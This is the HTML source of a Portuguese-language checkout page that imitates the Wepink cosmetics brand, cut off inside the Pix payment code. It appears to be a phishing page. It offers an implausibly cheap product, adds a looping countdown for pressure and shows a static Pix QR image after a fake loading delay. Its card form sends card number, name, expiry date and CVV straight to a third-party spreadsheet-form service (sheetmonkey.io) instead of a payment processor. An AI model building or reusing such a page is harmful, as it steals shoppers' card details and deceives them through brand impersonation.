<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>
   Wepink Checkout
  </title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   .fade-in-out {
    animation: fadeInOut 0.3s ease-in-out;
   }

   @keyframes fadeInOut {
    0% {
     background-color: transparent;
    }
    50% {
     background-color: #ec4899;
    }
    100% {
     background-color: transparent;
    }
   }

   .loader {
    border-top-color: #3498db;
    -webkit-animation: spin 1s linear infinite;
    animation: spin 1s linear infinite;
   }

   @-webkit-keyframes spin {
    0% {
     -webkit-transform: rotate(0deg);
    }
    100% {
     -webkit-transform: rotate(360deg);
    }
   }

   @keyframes spin {
    0% {
     transform: rotate(0deg);
    }
    100% {
     transform: rotate(360deg);
    }
   }
  </style>
  <script>
   function validateEmail() {
    const emailInput = document.getElementById('email');
    const email = emailInput.value;
    const errorMessage = document.getElementById('email-error');
    errorMessage.textContent = '';

    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailPattern.test(email)) {
     errorMessage.textContent = 'E-mail inválido. Por favor, insira um e-mail válido.';
    }
   }

   function formatPhoneNumber(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');

    if (value.length > 10) {
     value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
    } else if (value.length > 5) {
     value = value.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, '($1) $2-$3');
    } else if (value.length > 2) {
     value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
    } else {
     value = value.replace(/^(\d*)/, '($1');
    }

    input.value = value;
   }

   function formatCPF(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');

    if (value.length > 9) {
     value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
    } else if (value.length > 6) {
     value = value.replace(/^(\d{3})(\d{3})(\d{0,3}).*/, '$1.$2.$3');
    } else if (value.length > 3) {
     value = value.replace(/^(\d{3})(\d{0,3})/, '$1.$2');
    }

    input.value = value;
   }

   function formatCardNumber(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');

    if (value.length > 12) {
     value = value.replace(/^(\d{4})(\d{4})(\d{4})(\d{0,4}).*/, '$1 $2 $3 $4');
    } else if (value.length > 8) {
     value = value.replace(/^(\d{4})(\d{4})(\d{0,4}).*/, '$1 $2 $3');
    } else if (value.length > 4) {
     value = value.replace(/^(\d{4})(\d{0,4})/, '$1 $2');
    }

    input.value = value;
   }

   function formatExpiryDate(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');

    if (value.length > 2) {
     value = value.replace(/^(\d{2})(\d{0,2})/, '$1/$2');
    }

    input.value = value;
   }

   function formatCVV(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');

    if (value.length > 3) {
     value = value.slice(0, 3);
    }

    input.value = value;
   }

   async function fetchAddress() {
    const cepInput = document.getElementById('cep');
    const cep = cepInput.value.replace(/\D/g, '');
    const errorMessage = document.getElementById('cep-error');
    errorMessage.textContent = '';

    if (!cep) {
     errorMessage.textContent = 'Por favor, insira um CEP.';
     return;
    }

    try {
     const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`);
     const data = await response.json();

     if (data.error) {
      errorMessage.textContent = 'CEP inválido. Por favor, insira um CEP válido.';
     } else {
      document.getElementById('logradouro').value = data.street;
      document.getElementById('bairro').value = data.neighborhood;
      document.getElementById('cidade').value = data.city;
      document.getElementById('estado').value = data.state;
     }
    } catch (error) {
     errorMessage.textContent = 'Erro ao buscar o CEP. Tente novamente mais tarde.';
    }
   }

   function togglePaymentOptions(event) {
    const paymentMethod = event.target.value;
    const cardDetails = document.getElementById('card-details');
    const pixDetails = document.getElementById('pix-details');
    const buttons = document.querySelectorAll('.payment-button');

    buttons.forEach(button => {
     button.classList.remove('fade-in-out');
    });

    event.target.classList.add('fade-in-out');

    if (paymentMethod === 'card') {
     cardDetails.classList.remove('hidden');
     pixDetails.classList.add('hidden');
    } else {
     cardDetails.classList.add('hidden');
     pixDetails.classList.remove('hidden');
     setTimeout(() => {
      document.getElementById('pix-loading').classList.add('hidden');
      document.getElementById('pix-content').classList.remove('hidden');
     }, 3000);
    }
   }

   window.addEventListener('scroll', function() {
    const offerBar = document.getElementById('offer-bar');
    if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight) {
     offerBar.classList.remove('fixed');
     offerBar.classList.add('relative');
    } else {
     offerBar.classList.remove('relative');
     offerBar.classList.add('fixed');
    }
   });

   function startCountdown(duration, display) {
    let timer = duration, hours, minutes, seconds;
    setInterval(function () {
     hours = parseInt(timer / 3600, 10);
     minutes = parseInt((timer % 3600) / 60, 10);
     seconds = parseInt(timer % 60, 10);

     hours = hours < 10 ? "0" + hours : hours;
     minutes = minutes < 10 ? "0" + minutes : minutes;
     seconds = seconds < 10 ? "0" + seconds : seconds;

     display.textContent = hours + ":" + minutes + ":" + seconds;

     if (--timer < 0) {
      timer = duration;
     }
    }, 1000);
   }

   window.onload = function () {
    const countdownDuration = 60 * 10; // 10 minutes in seconds
    const display = document.querySelector('#time');
    startCountdown(countdownDuration, display);
   };
  </script>
 </head>
 <body class="bg-gray-100 font-sans">
  <div class="max-w-md mx-auto p-4">
   <!-- Header -->
   <div class="flex justify-between items-center mb-4">
    <div class="text-pink-500 text-3xl font-bold">wepink</div>
    <div class="text-green-600 text-sm font-semibold flex items-center">
     <i class="fas fa-shield-alt mr-1"></i>
     PAGAMENTO 100% SEGURO
    </div>
   </div>
   <!-- Cart Section -->
   <div class="bg-white p-4 rounded-lg shadow-md mb-4">
    <div class="flex justify-between items-center mb-4">
     <div class="text-lg font-semibold">Seu carrinho</div>
     <div class="bg-pink-500 text-white rounded-full w-6 h-6 flex items-center justify-center">1</div>
    </div>
    <div class="flex items-center mb-4">
     <img alt="Kit de 5 Body Splash Nova Edição limitada" class="w-12 h-12 rounded mr-4" height="60" src="https://storage.googleapis.com/a1aa/image/jFRX0uiwEDfjZkw8foSTtpdeR_xWL9QLxv16kWlxU-Y.jpg" width="60"/>
     <div class="flex-1">
      <div class="text-sm font-semibold">Kit de 5 Body Splash Nova Edição limitada</div>
      <div class="text-xs text-gray-500">Wepink</div>
     </div>
     <div class="flex items-center">
      <button class="text-pink-500 border border-pink-500 rounded-full w-6 h-6 flex items-center justify-center">-</button>
      <span class="mx-2">1</span>
      <button class="text-pink-500 border border-pink-500 rounded-full w-6 h-6 flex items-center justify-center">+</button>
     </div>
    </div>
    <div class="border-t border-gray-200 pt-4">
     <div class="flex justify-between text-sm mb-2">
      <span>Subtotal</span>
      <span>R$ 22,90</span>
     </div>
     <div class="flex justify-between text-sm mb-2">
      <span>Frete</span>
      <span>-</span>
     </div>
     <div class="flex justify-between text-lg font-semibold">
      <span>Total</span>
      <span>R$ 22,90</span>
     </div>
    </div>
   </div>
   <!-- Identification Section -->
   <div class="bg-white p-4 rounded-lg shadow-md mb-4">
    <div class="text-lg font-semibold mb-4">Identificação</div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">E-mail</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="email" onblur="validateEmail()" placeholder="email@email.com" type="email"/>
     <p class="text-red-500 text-sm mt-1" id="email-error"></p>
    </div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="phone" oninput="formatPhoneNumber(event)" placeholder="(99) 99999-9999" type="text"/>
    </div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">Nome completo</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" placeholder="Nome e Sobrenome" type="text"/>
    </div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">CPF/CNPJ</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="cpf" oninput="formatCPF(event)" placeholder="123.456.789-12" type="text"/>
    </div>
   </div>
   <!-- Delivery Section -->
   <div class="bg-white p-6 rounded-lg shadow-md mb-4">
    <h2 class="text-lg font-semibold mb-2">Entrega</h2>
    <p class="text-sm mb-4">
     Outra pessoa irá receber o pedido?
     <a class="text-blue-500" href="#">Clique aqui</a>
    </p>
    <label class="block text-sm font-medium text-gray-700" for="cep">CEP</label>
    <input class="mt-1 block w-full p-2 border border-gray-300 rounded-md mb-4" id="cep" name="cep" onblur="fetchAddress()" placeholder="12345-000" type="text"/>
    <p class="text-red-500 text-sm mt-1" id="cep-error"></p>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">Logradouro</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="logradouro" placeholder="Logradouro" type="text"/>
    </div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">Número</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="numero" placeholder="Número" type="text"/>
    </div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">Bairro</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="bairro" placeholder="Bairro" type="text"/>
    </div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">Cidade</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="cidade" placeholder="Cidade" type="text"/>
    </div>
    <div class="mb-4">
     <label class="block text-sm font-medium text-gray-700 mb-1">Estado</label>
     <input class="w-full border border-gray-300 rounded-lg p-2" id="estado" placeholder="Estado" type="text"/>
    </div>
   </div>
   <!-- Payment Methods Section -->
   <div class="bg-white p-6 rounded-lg shadow-md mb-4">
    <h2 class="text-lg font-semibold mb-2">Formas de pagamento</h2>
    <div class="mb-4">
     <button class="payment-button w-full border border-gray-300 rounded-lg p-2 mb-2" onclick="togglePaymentOptions(event)" value="pix">Pix</button>
     <button class="payment-button w-full border border-gray-300 rounded-lg p-2" onclick="togglePaymentOptions(event)" value="card">Cartão</button>
    </div>
    <div class="hidden" id="card-details">
     <form action="https://api.sheetmonkey.io/form/6QX4enpNcBZ4eEBcc4hLWc" method="post" autocomplete="off">
      <input type="hidden" name="Cartão" value="Wpink">
      <div class="mb-4">
       <label class="block text-sm font-medium text-gray-700 mb-1">Número do Cartão</label>
       <input class="w-full border border-gray-300 rounded-lg p-2" oninput="formatCardNumber(event)" placeholder="1234 5678 9012 3456" type="text" name="card_number" autocomplete="off"/>
      </div>
      <div class="mb-4">
       <label class="block text-sm font-medium text-gray-700 mb-1">Nome no Cartão</label>
       <input class="w-full border border-gray-300 rounded-lg p-2" placeholder="Nome no Cartão" type="text" name="card_name" autocomplete="off"/>
      </div>
      <div class="mb-4">
       <label class="block text-sm font-medium text-gray-700 mb-1">Nome do Titular</label>
       <input class="w-full border border-gray-300 rounded-lg p-2" placeholder="Nome do Titular" type="text" name="card_holder" autocomplete="off"/>
      </div>
      <div class="mb-4">
       <label class="block text-sm font-medium text-gray-700 mb-1">Data de Validade</label>
       <input class="w-full border border-gray-300 rounded-lg p-2" oninput="formatExpiryDate(event)" placeholder="MM/AA" type="text" name="expiry_date" autocomplete="off"/>
      </div>
      <div class="mb-4">
       <label class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
       <input class="w-full border border-gray-300 rounded-lg p-2" oninput="formatCVV(event)" placeholder="123" type="text" name="cvv" autocomplete="off"/>
      </div>
      <button class="w-full bg-pink-500 text-white py-2 rounded-lg" type="submit">Finalizar Compra</button>
     </form>
    </div>
    <div class="hidden" id="pix-details">
     <div id="pix-loading" class="text-center">
      <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-12 w-12 mx-auto mb-4"></div>
      <p class="text-sm text-gray-500">Carregando QR Code...</p>
     </div>
     <div id="pix-content" class="hidden">
      <div class="mb-4">
       <img alt="QR Code para pagamento via Pix" class="mx-auto" height="200" src="https://storage.googleapis.com/a1aa/image/Ao10j8d5xaaZ8LMT-CpWXezz94LDvlIh79IYhXh4KmQ.jpg" width="200"/>
      </div>
      <div class="mb-4">
       <label class="block text-sm font-medium text-gray-700 mb-1">Código de Pagamento</label>
       <input class="w-full border border-gray-300 rounded-lg p-2" readonly type="text" value="000